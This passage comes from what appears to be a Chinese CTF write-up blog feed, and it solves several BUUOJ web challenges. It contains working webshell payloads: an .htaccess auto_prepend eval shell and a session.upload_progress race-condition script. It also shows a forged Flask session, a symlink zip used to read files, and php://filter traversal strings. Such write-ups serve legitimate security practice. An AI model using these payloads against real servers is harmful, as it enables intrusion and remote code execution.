punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å…·ä½“è§<a href="https://syunaht.com/p/1042722407.html">åˆ·é¢˜ç¬”è®°:[XNUCA2019Qualifier]EasyPHP</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># %23 æ˜¯# çš„urlç¼–ç ï¼Œé˜²æ­¢pythonæŠŠè‡ªå·±æ³¨é‡Šäº†</span><span class="token comment"># \\ ï¼Œ ä¸¤ä¸ª\\ä¸Šä¼ ä¸Šå»å°±æ˜¯ ä¸€ä¸ª \</span>content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\le ".htaccess"%23&lt;?php eval($_POST[cmd]);?>\\'''</span>url <span class="token operator">=</span> <span class="token string">"http://4a18370b-9163-4561-8330-fab04fc0ca5e.node4.buuoj.cn:81/?filename=.htaccess&amp;content=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èšå‰‘è¿æ¥ä¸‹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SWPU2019]Web3</title>
      <link href="/p/950891946.html"/>
      <url>/p/950891946.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[proc|sessionæ„é€ ]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113040550.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç›´æ¥ç™»å½•</p><p>è¿›å»ç‚¹uploadæç¤º</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113153000.png"></p><p>æ€€ç–‘cookiesæ„é€ </p><p>è§£ä¸ªsession</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134558982.png"></p><p>è¦æƒ³æ„é€ sessionéœ€è¦çŸ¥é“key</p><blockquote><p><code>key</code>åœ¨è®¿é—®ä¸å­˜åœ¨çš„ç›®å½•æ—¶ï¼Œä¼šå‡ºç°åœ¨è¯·æ±‚å¤´å½“ä¸­</p></blockquote><p>è¿™ä¸ªç€å®æƒ³ä¸åˆ°</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134204719.png"></p><p>è§£ä¸ªç </p><pre class="line-numbers language-none"><code class="language-none">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ”¹ä¸‹idä¸º1ï¼ŒåŠ å¯†</p><pre class="line-numbers language-none"><code class="language-none">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTRZrw.bnK5U9yUqQ7hlU1hGddmyAzlE4g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134657578.png"></p><p>æ³¨é‡Šæœ‰æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§æ¦‚å°±æ˜¯ä¸Šä¼ zipå‹ç¼©åŒ…ï¼Œç„¶åè§£å‹æ˜¾ç¤ºå›¾ç‰‡</p><p>ç»™å‡ºäº†flagè·¯å¾„</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905135552520.png"></p><p>è¿™é‡Œåˆ©ç”¨è½¯é“¾æ¥å’Œ<code>/proc/self/cwd</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg testzip -ry test.zip test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šä¼ ï¼Œç»“æŸ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905140736523.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[WMCTF2020]Make PHP Great Again</title>
      <link href="/p/2339718074.html"/>
      <url>/p/2339718074.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[require_once|proc|æ–‡ä»¶åŒ…å«|session|session.upload_progress]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">require_once</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</p><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><blockquote><p>PHPæœ€æ–°ç‰ˆçš„å°Trick,require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«</p><p><code>/proc/[pid]</code>è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ï¼Œè€Œ<code>/proc/self</code>æŒ‡çš„æ˜¯å½“å‰è¿›ç¨‹(è‡ªèº«è¿›ç¨‹)çš„pidï¼Œå°±ç±»ä¼¼äºç±»é‡Œé¢çš„<code>this</code></p><p><code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦ä¸€ç§å†™æ³•</p><blockquote><p><code>/proc/self/cwd/</code>æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œ</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;&#x2F;123&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è§£æ³•2-æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session-upload-progress"><a href="#è§£æ³•2-æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session-upload-progress" class="headerlink" title="è§£æ³•2 æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session.upload_progress"></a>è§£æ³•2 æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session.upload_progress</h3><p>ä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„é¢˜ï¼Œå…·ä½“è§<a href="https://syunaht.com/p/2193317358.html#toc-heading-5">åˆ·é¢˜ç¬”è®°:[NPUCTF2020]ezinclude</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> <span class="token string">'http://f1f8290e-450c-47c9-8dfd-b1bb5f4a2807.node4.buuoj.cn:81/'</span>sessid <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            host<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php $shell='&lt;?php @eval($_POST[cmd])?>';system('ls /');fputs(fopen('shell.php','w'),$shell);file_put_contents('shell.php',$shell);echo md5('1');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 1çš„MD5å€¼</span>        <span class="token keyword">if</span> <span class="token string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># ä¸»çº¿ç¨‹é€€å‡ºæ—¶ï¼Œä¸ç®¡å­çº¿ç¨‹æ˜¯å¦å®Œæˆéƒ½éšä¸»çº¿ç¨‹é€€å‡º</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    read<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯•äº†ä¸‹æ–‡ä»¶å†™å…¥ä¸äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œåªèƒ½ç›´æ¥è¯»</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WMCTF2020-Make-PHP-Great-Again/image-20210905002054657.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> æ¡ä»¶ç«äº‰ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[BSidesCF 2019]Pick Tac Toe</title>
      <link href="/p/1213141305.html"/>
      <url>/p/1213141305.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Pick-Tac-Toe/image-20210903234642017.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸ºä»€ä¹ˆæˆ‘çš„é¶æœºç‚¹å‡»æ²¡ååº”</p><p>ä¼¼ä¹æœ‰é”™ï¼Œå¥½ç´¯</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Pick-Tac-Toe/image-20210903234709417.png"></p><p>åŸæ¥æ˜¯googleapiè¢«å¢™æ²¡è¿ä¸Šèµ„æºï¼Œå¼€ä¸ªæ¢¯å­å°±å¥½</p><p>æŠ“åŒ…ä¿®æ”¹ç‚¹å‡»çš„idï¼Œå¯é‡å¤ï¼Œæ¸¸æˆç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[NESTCTF 2019]Love Math 2</title>
      <link href="/p/3991483090.html"/>
      <url>/p/3991483090.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//ä¾‹å­ c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token 